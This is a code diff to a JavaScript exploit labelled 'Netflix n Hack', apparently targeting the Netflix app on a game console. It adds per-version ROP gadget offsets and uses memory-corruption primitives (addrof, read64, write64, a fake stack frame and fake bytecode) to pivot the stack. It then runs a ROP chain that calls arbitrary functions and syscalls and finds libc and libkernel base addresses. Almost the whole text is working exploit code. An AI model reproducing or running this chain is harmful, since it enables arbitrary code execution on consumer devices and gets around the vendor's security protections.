@@ -39,6 +39,54 @@ function hex(value)
     return "0x" + value.toString(16).padStart(8, "0");
 }
 
+class gadgets {
+    constructor() {
+        try {
+            switch (nrdp.version.nova.app_version) {
+                case 'Gemini-U6-2':         // EU 6.000
+                    /** Gadgets for Function Arguments **/
+                    this.pop_rax = 0x6c233n;
+                    this.pop_rdi = 0x1a729bn;
+                    this.pop_rsi = 0x14d8n;
+                    this.pop_rdx = 0x3ec42n;
+                    this.pop_rcx = 0x2485n;
+                    this.pop_r8 = 0x6c232n;
+                    this.pop_r9 = 0x66511bn;
+                    
+                    /** Other Gadgets **/
+                    this.pop_rbp = 0x79n;
+                    this.pop_rbx = 0x2e1ebn;
+                    this.pop_rsp = 0x1df1e1n;
+                    this.pop_rsp_pop_rbp = 0x17ecb4en;
+                    this.mov_qword_ptr_rdi_rax = 0x1dcba9n;
+                    break;
+                case 'Gemini-U5-18':        // US 5.000
+                    /** Gadgets for Function Arguments **/
+                    this.pop_rax = 0x6c233n;
+                    this.pop_rdi = 0x24f3c2n; // Changed
+                    this.pop_rsi = 0x14d8n;
+                    this.pop_rdx = 0x3ec42n;
+                    this.pop_rcx = 0x2485n;
+                    this.pop_r8 = 0x6c232n;
+                    this.pop_r9 = 0x66511bn;
+                    
+                    /** Other Gadgets **/
+                    this.pop_rbp = 0x79n;
+                    this.pop_rbx = 0x2e1ebn;
+                    this.pop_rsp = 0x13c719n; // Changed
+                    this.pop_rsp_pop_rbp = 0x17ecb4en;
+                    this.mov_qword_ptr_rdi_rax = 0x1dcba9n;
+                    break;
+                default:
+                    throw new Error("App version not supported");
+            }
+        }
+        catch (e) {
+            throw new Error("App version not supported : " + e);
+        }
+    }
+}
+
 (function() {
     var overlay = null;
     var lines = [];
@@ -130,6 +178,8 @@ function hex(value)
     log("=== Netflix n Hack ===");
 
     try {
+
+        const g = new gadgets(); // Load gadgets
 
         let hole = trigger();
 
@@ -569,7 +619,7 @@ function hex(value)
 
         function rop_smash (x) {
           let a = 100;
-          return 0x1234567812345678n;   // We need a function with a 'constant' element
+          return 0x1234567812345678n;
         }
 
         let value_delete = rop_smash(1); // Generate Bytecode
@@ -578,10 +628,7 @@ function hex(value)
         log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
         add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
         add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
-        add_rop_smash_code_store = add_rop_smash_code + 0x22n;
-        //add_rop_smash_constants_list = read32(add_rop_smash_code + 0x08n) -1n;
-        //add_rop_smash_constant_0 = read32(add_rop_smash_constants_list + 0x08n) -1n + 8n;
-        
+        add_rop_smash_code_store = add_rop_smash_code + 0x22n;        
 
         const fake_frame = new BigUint64Array(8);     // Up to 8 * 8bytes are created inmediatly before the main Obj
         const add_fake_frame = addrof(fake_frame);
@@ -598,36 +645,6 @@ function hex(value)
         const return_value_addr = get_backing_store(return_value_buffer);
         log("Address of return_value_buffer: " + hex(addrof(return_value_buffer)) );
         log("Address of return_value_buffer_store: " + hex(return_value_addr) );
-
-        /** Gadgets for Function Arguments **/
-        const g_pop_rax = 0x6c233n;
-        const g_pop_rdi = 0x1a729bn;
-        const g_pop_rsi = 0x14d8n;
-        const g_pop_rdx = 0x3ec42n;
-        const g_pop_rcx = 0x2485n;
-        const g_pop_r8 = 0x6c232n;
-        const g_pop_r9 = 0x66511bn;
-        
-        /** Other Gadgets **/
-        const g_pop_rbp = 0x79n;
-        const g_pop_rbx = 0x2e1ebn;
-        const g_pop_rsp = 0x1df1e1n;
-        const g_pop_rsp_pop_rbp = 0x17ecb4en;
-        const g_mov_qword_ptr_rdi_rax = 0x1dcba9n;
-
-        /***** LibC *****/
-        const libc_base = read64_uncompressed(eboot_base + 0x241F2B0n) - 0x1C0n;
-        log("libc base : " + hex(libc_base));
-        //const libc_base2 = read64_uncompressed(eboot_base + 0x27EC408n) - 0x2C17n;
-        //log("libc base: " + hex(libc_base2));
-        const gettimeofdayAddr = read64_uncompressed(libc_base + 0x10f998n);
-        log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
-        const syscall_wrapper = gettimeofdayAddr + 0x7n;
-        log("syscall_wrapper : " + hex(syscall_wrapper));
-        
-        /***** LibKernel *****/ // TO DO
-        //const libkernel_base = 0x80EA14000n;
-        //log("libkernel base: " + hex(libkernel));
 
         fake_bytecode_buffer[0] = 0xABn;
         fake_bytecode_buffer[1] = 0x00n;
@@ -655,7 +672,7 @@ function hex(value)
         write64(add_fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
         write64(add_fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
                                                                           
-        write64(add_fake_frame + 0x08n, eboot_base + g_pop_rsp); // pop rsp ; ret --> this change the stack pointer to your stack
+        write64(add_fake_frame + 0x08n, eboot_base + g.pop_rsp); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(add_fake_frame + 0x10n, rop_address);
 
         // This function is calling a given function address and takes all arguments
@@ -670,35 +687,35 @@ function hex(value)
             let i = 0;
 
             // Syscall Number (Syscall Wrapper)
-            rop_chain[i++] = eboot_base + g_pop_rax;
+            rop_chain[i++] = eboot_base + g.pop_rax;
             rop_chain[i++] = rax;
 
             // Arguments
-            rop_chain[i++] = eboot_base + g_pop_rdi;
+            rop_chain[i++] = eboot_base + g.pop_rdi;
             rop_chain[i++] = arg1;
-            rop_chain[i++] = eboot_base + g_pop_rsi;
+            rop_chain[i++] = eboot_base + g.pop_rsi;
             rop_chain[i++] = arg2;
-            rop_chain[i++] = eboot_base + g_pop_rdx;
+            rop_chain[i++] = eboot_base + g.pop_rdx;
             rop_chain[i++] = arg3;
-            rop_chain[i++] = eboot_base + g_pop_rcx;
+            rop_chain[i++] = eboot_base + g.pop_rcx;
             rop_chain[i++] = arg4;
-            rop_chain[i++] = eboot_base + g_pop_r8;
+            rop_chain[i++] = eboot_base + g.pop_r8;
             rop_chain[i++] = arg5;
-            rop_chain[i++] = eboot_base + g_pop_r9;
+            rop_chain[i++] = eboot_base + g.pop_r9;
             rop_chain[i++] = arg6;
 
             // Call Syscall Wrapper / Function
             rop_chain[i++] = address;
 
             // Store return value to return_value_addr
-            rop_chain[i++] = eboot_base + g_pop_rdi;
+            rop_chain[i++] = eboot_base + g.pop_rdi;
             rop_chain[i++] = return_value_addr;
-            rop_chain[i++] = eboot_base + g_mov_qword_ptr_rdi_rax;
+            rop_chain[i++] = eboot_base + g.mov_qword_ptr_rdi_rax;
 
             // Return to JS
-            rop_chain[i++] = eboot_base + g_pop_rax;
+            rop_chain[i++] = eboot_base + g.pop_rax;
             rop_chain[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
-            rop_chain[i++] = eboot_base + g_pop_rsp_pop_rbp;
+            rop_chain[i++] = eboot_base + g.pop_rsp_pop_rbp;
             rop_chain[i++] = real_rbp;
             
             write64(add_rop_smash_code_store, 0xab00260325n);
@@ -708,6 +725,35 @@ function hex(value)
             //return BigInt(return_value_buffer[0]); // Return value returned by function
             // Seems like this is not being executed
         }
+
+        function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
+            call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
+            return return_value_buffer[0];
+        }
+
+        /***** LibC *****/
+        const libc_base = read64_uncompressed(eboot_base + 0x241F2B0n) - 0x1C0n;
+        log("libc base : " + hex(libc_base));
+        const gettimeofdayAddr = read64_uncompressed(libc_base + 0x10f998n);
+        log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
+        const syscall_wrapper = gettimeofdayAddr + 0x7n;
+        log("syscall_wrapper : " + hex(syscall_wrapper));
+        const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x10fa88n);
+
+        const mod_info = malloc(0x300);
+        const SEGMENTS_OFFSET = 0x160n;
+        
+        ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
+        log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));
+
+        if (ret !== 0x0n) {
+            log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
+            throw new Error("sceKernelGetModuleInfoFromAddr failed");
+        }
+        
+        /***** LibKernel *****/
+        libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
+        log("libkernel_base @ " + hex(libkernel_base));
 
         function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) 
         {
